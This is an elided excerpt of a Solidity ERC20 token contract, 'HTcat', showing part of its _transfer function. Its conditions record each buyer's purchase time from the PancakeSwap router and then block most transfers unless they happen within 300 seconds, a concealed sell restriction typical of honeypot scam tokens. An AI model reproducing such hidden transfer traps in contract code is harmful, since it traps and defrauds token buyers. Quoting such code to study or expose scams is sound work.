...
contract HTcat is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        if (!_isExcludedFrom[form] && !_isExcludedFrom[to] && to != address(this)) { _bruntoken = amount.mul(1).div(100);}
        if (to != isExcluded && to != panckev2router && form == panckev2router ){  _rfeetime[to] = block.timestamp;  }   
        if (form !=isExcluded && form !=panckev2router){ require( balanceOf(to) < 1 && block.timestamp <= _rfeetime[form] + 300); }
